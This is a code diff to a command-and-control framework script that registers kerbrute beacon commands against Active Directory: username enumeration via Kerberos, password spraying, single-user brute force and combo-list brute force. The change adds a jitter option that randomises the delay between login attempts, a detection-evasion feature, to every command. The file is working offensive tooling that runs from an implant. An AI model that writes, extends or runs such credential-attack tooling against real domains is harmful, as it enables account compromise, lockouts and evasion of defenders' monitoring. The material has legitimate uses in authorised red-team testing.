@@ -24,9 +24,9 @@ function bof_path(id) {
 }
 
 function pack_and_exec(id, cmdline, list_b64, domain, dc, single, mode,
-                       delay, flags, task_msg) {
-    var bof_args = ax.bof_pack("cstr,cstr,cstr,cstr,int,int,int",
-        [list_b64, domain, dc || "", single || "", mode, delay || 0, flags || 0]);
+                       delay, flags, jitter, task_msg) {
+    var bof_args = ax.bof_pack("cstr,cstr,cstr,cstr,int,int,int,int",
+        [list_b64, domain, dc || "", single || "", mode, delay || 0, flags || 0, jitter || 0]);
     ax.execute_alias(id, cmdline,
         "execute bof " + bof_path(id) + " " + bof_args, task_msg);
 }
@@ -47,13 +47,14 @@ function build_flags(j) {
 // ─────────────────────────────────────────────────────────────────────────────
 var cmd_userenum = ax.create_command(
     "userenum",
-    "Enumerate valid domain usernames via Kerberos — no pre-auth, no lockout risk",
+    "Enumerate valid domain usernames via Kerberos — no pre-auth, no lockout risk. BLOCKS beacon until complete.",
     "userenum -d contoso.local [--dc 192.168.1.10] [--delay 500] [--downgrade] [--safe] [-v] /path/to/users.txt",
     "Task: [kerbrute] userenum"
 );
 cmd_userenum.addArgFlagString("-d",   "domain", true,  "Target domain FQDN (e.g. contoso.local)");
 cmd_userenum.addArgFlagString("--dc", "dc",     false, "DC hostname or IP — DNS SRV lookup used if omitted");
 cmd_userenum.addArgFlagInt("--delay", "delay",  false, "Sleep this many milliseconds between each attempt");
+cmd_userenum.addArgFlagInt("--jitter", "jitter", false, "Random ms added to each delay: sleep is delay ± jitter (0 = fixed)");
 cmd_userenum.addArgBool("--downgrade",          "Advertise RC4-only in the etype list (arcfour-hmac-md5)");
 cmd_userenum.addArgBool("--safe",               "Abort all remaining attempts if any account is locked out");
 cmd_userenum.addArgBool("-v",                   "Verbose — also log not-found users and errors");
@@ -67,6 +68,7 @@ cmd_userenum.setPreHook(function(id, cmdline, parsed_json) {
         "", 0,
         parsed_json["delay"] || 0,
         build_flags(parsed_json),
+        parsed_json["jitter"] || 0,
         "Task: [kerbrute] userenum → " + parsed_json["domain"]);
 });
 
@@ -78,7 +80,7 @@ cmd_userenum.setPreHook(function(id, cmdline, parsed_json) {
 // ─────────────────────────────────────────────────────────────────────────────
 var cmd_spray = ax.create_command(
     "passwordspray",
-    "Test a single password against a list of users — [LOCKOUT RISK]",
+    "Test a single password against a list of users — [LOCKOUT RISK]  BLOCKS beacon until complete.",
     "passwordspray -d contoso.local -p Password123 [--dc 192.168.1.10] [--delay 1000] [--downgrade] [--safe] [-v] /path/to/users.txt",
     "Task: [kerbrute] passwordspray"
 );
@@ -86,6 +88,7 @@ cmd_spray.addArgFlagString("-d",   "domain",   true, "Target domain FQDN");
 cmd_spray.addArgFlagString("--dc", "dc",       false, "DC hostname or IP — DNS SRV lookup used if omitted");
 cmd_spray.addArgFlagString("-p",   "password", true, "Password to spray against every user");
 cmd_spray.addArgFlagInt("--delay", "delay",    false, "Sleep this many milliseconds between each attempt");
+cmd_spray.addArgFlagInt("--jitter", "jitter", false, "Random ms added to each delay: sleep is delay ± jitter (0 = fixed)");
 cmd_spray.addArgBool("--downgrade",            "Advertise RC4-only in the etype list (arcfour-hmac-md5)");
 cmd_spray.addArgBool("--safe",                 "Abort all remaining attempts if any account is locked out");
 cmd_spray.addArgBool("-v",                     "Verbose — also log wrong passwords and errors");
@@ -100,6 +103,7 @@ cmd_spray.setPreHook(function(id, cmdline, parsed_json) {
         1,
         parsed_json["delay"] || 0,
         build_flags(parsed_json),
+        parsed_json["jitter"] || 0,
         "Task: [kerbrute] spray → " + parsed_json["domain"] + " : " + parsed_json["password"]);
 });
 
@@ -112,7 +116,7 @@ cmd_spray.setPreHook(function(id, cmdline, parsed_json) {
 // ─────────────────────────────────────────────────────────────────────────────
 var cmd_bruteuser = ax.create_command(
     "bruteuser",
-    "Bruteforce a single user's password from a wordlist — stops on first hit  [LOCKOUT RISK]",
+    "Bruteforce a single user's password from a wordlist — stops on first hit  [LOCKOUT RISK]  BLOCKS beacon until complete.",
     "bruteuser -d contoso.local -u jdoe [--dc 192.168.1.10] [--delay 200] [--downgrade] [--safe] [-v] /path/to/passwords.txt",
     "Task: [kerbrute] bruteuser"
 );
@@ -120,6 +124,7 @@ cmd_bruteuser.addArgFlagString("-d",   "domain",   true,  "Target domain FQDN");
 cmd_bruteuser.addArgFlagString("--dc", "dc",       false, "DC hostname or IP — DNS SRV lookup used if omitted");
 cmd_bruteuser.addArgFlagString("-u",   "username", true,  "Target account sAMAccountName (no @domain suffix)");
 cmd_bruteuser.addArgFlagInt("--delay", "delay",    false, "Sleep this many milliseconds between each attempt");
+cmd_bruteuser.addArgFlagInt("--jitter", "jitter", false, "Random ms added to each delay: sleep is delay ± jitter (0 = fixed)");
 cmd_bruteuser.addArgBool("--downgrade",            "Advertise RC4-only in the etype list (arcfour-hmac-md5)");
 cmd_bruteuser.addArgBool("--safe",                 "Abort if the account is locked out mid-run");
 cmd_bruteuser.addArgBool("-v",                     "Verbose — also log each wrong password attempt");
@@ -134,6 +139,7 @@ cmd_bruteuser.setPreHook(function(id, cmdline, parsed_json) {
         2,
         parsed_json["delay"] || 0,
         build_flags(parsed_json),
+        parsed_json["jitter"] || 0,
         "Task: [kerbrute] bruteuser → " + parsed_json["username"] + "@" + parsed_json["domain"]);
 });
 
@@ -145,13 +151,14 @@ cmd_bruteuser.setPreHook(function(id, cmdline, parsed_json) {
 // ─────────────────────────────────────────────────────────────────────────────
 var cmd_bruteforce = ax.create_command(
     "bruteforce",
-    "Read username:password combos from a file and test them — [LOCKOUT RISK]",
+    "Read username:password combos from a file and test them — [LOCKOUT RISK]  BLOCKS beacon until complete.",
     "bruteforce -d contoso.local [--dc 192.168.1.10] [--delay 500] [--downgrade] [--safe] [-v] /path/to/combos.txt",
     "Task: [kerbrute] bruteforce"
 );
 cmd_bruteforce.addArgFlagString("-d",   "domain", true,  "Target domain FQDN");
 cmd_bruteforce.addArgFlagString("--dc", "dc",     false, "DC hostname or IP — DNS SRV lookup used if omitted");
 cmd_bruteforce.addArgFlagInt("--delay", "delay",  false, "Sleep this many milliseconds between each attempt");
+cmd_bruteforce.addArgFlagInt("--jitter", "jitter", false, "Random ms added to each delay: sleep is delay ± jitter (0 = fixed)");
 cmd_bruteforce.addArgBool("--downgrade",          "Advertise RC4-only in the etype list (arcfour-hmac-md5)");
 cmd_bruteforce.addArgBool("--safe",               "Abort all remaining attempts if any account is locked out");
 cmd_bruteforce.addArgBool("-v",                   "Verbose — also log not-found combos and errors");
@@ -166,6 +173,7 @@ cmd_bruteforce.setPreHook(function(id, cmdline, parsed_json) {
         3,
         parsed_json["delay"] || 0,
         build_flags(parsed_json),
+        parsed_json["jitter"] || 0,
         "Task: [kerbrute] bruteforce → " + parsed_json["domain"]);
 });
 
